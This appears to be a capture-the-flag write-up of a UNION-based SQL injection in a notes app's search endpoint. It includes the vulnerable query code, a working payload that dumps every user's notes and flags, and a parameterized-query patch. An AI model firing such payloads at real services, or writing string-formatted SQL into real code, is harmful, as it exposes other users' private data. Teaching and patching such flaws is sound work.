# SecureNotes - vulnerability writeup and patch

## The vulnerability: UNION-based SQL injection in `/api/notes/search`

### Where
`app.py`, in `search_notes()`. The search SQL is assembled with Python
`%`-string formatting, dropping the raw `q` parameter straight into the query
text:

```python
# VULNERABLE (shipped in app.py)
q = request.args.get("q", "")
sql = "SELECT id,title,body FROM notes WHERE user_id=%d AND (title LIKE '%%%s%%' OR body LIKE '%%%s%%')" % (uid, q, q)
rows = _conn.execute(sql).fetchall()
```

After formatting, a request like `?q=hello` produces the intended query:

```
SELECT id,title,body FROM notes WHERE user_id=7 AND (title LIKE '%hello%' OR body LIKE '%hello%')
```

But `q` is attacker-controlled text placed *inside* the string literal. An
attacker can close the literal and the open parenthesis, append their own
`SELECT`, and comment out the remainder.

### Why it is exploitable
The endpoint returns exactly three columns (`id`, `title`, `body`), which lines
up perfectly with a 3-column `UNION SELECT`. The `WHERE user_id=<uid>` clause
that is supposed to scope results to the current user is bypassed because the
injected `UNION SELECT` runs as its own, unrestricted query.

### Exploit
Authenticate (register + login - the endpoint requires a session), then send:

```
GET /api/notes/search?q=zzz%25')%20UNION%20SELECT%20id,title,body%20FROM%20notes--%20-
```

(the `q` value, URL-decoded, is `zzz%') UNION SELECT id,title,body FROM notes-- -`)

The effective SQL becomes:

```
SELECT id,title,body FROM notes
WHERE user_id=7 AND (title LIKE '%zzz%')
UNION SELECT id,title,body FROM notes
```

- `zzz%'` closes the `LIKE` string literal.
- `)` closes the `AND (` parenthesis so the left-hand `SELECT` is well-formed.
- `UNION SELECT id,title,body FROM notes` dumps **every** user's notes.
- `-- -` comments out the trailing `%' OR body LIKE '%...%')` so the statement
  parses cleanly.

Every note body in the database is returned, including every planted flag. The
flags are the note bodies, matched by the regex `[A-Z0-9]{31}=`. See
`sploit.py`.

## The patch

Use a parameterized query. Bind the wildcard-wrapped search term as parameters
with `?` placeholders instead of formatting it into the SQL text, and keep the
`user_id` bound as a parameter too:

```python
# FIXED
q = request.args.get("q", "")
like = "%" + q + "%"
sql = "SELECT id,title,body FROM notes WHERE user_id=? AND (title LIKE ? OR body LIKE ?)"
rows = _conn.execute(sql, (uid, like, like)).fetchall()
```

### Exact change
Replace the two vulnerable lines:

```python
sql = "SELECT id,title,body FROM notes WHERE user_id=%d AND (title LIKE '%%%s%%' OR body LIKE '%%%s%%')" % (uid, q, q)
rows = _conn.execute(sql).fetchall()
```

with:

```python
like = "%" + q + "%"
sql = "SELECT id,title,body FROM notes WHERE user_id=? AND (title LIKE ? OR body LIKE ?)"
rows = _conn.execute(sql, (uid, like, like)).fetchall()
```

(Within the `with _db_lock:` block, the `execute` call just gains the params
tuple.)

### Why this kills the attack but keeps search working
With `?` placeholders the SQLite driver sends the query text and the parameter
values separately. The value of `q` is treated strictly as data for the `LIKE`
comparison - it is never parsed as SQL, so quotes, parentheses, `UNION`, and
`--` inside `q` are just literal characters to match against. The injection
payload `zzz%') UNION SELECT ...` becomes a harmless search for the literal
substring `zzz%') UNION SELECT ...`, which simply matches nothing.

Legitimate search is unaffected: the wildcards are added by the server
(`"%" + q + "%"`), so searching for `milk` still matches `shopping: milk, eggs`
exactly as before. The `user_id=?` binding continues to scope results to the
caller, and because no injection can alter the statement structure, the
per-user isolation can no longer be bypassed.
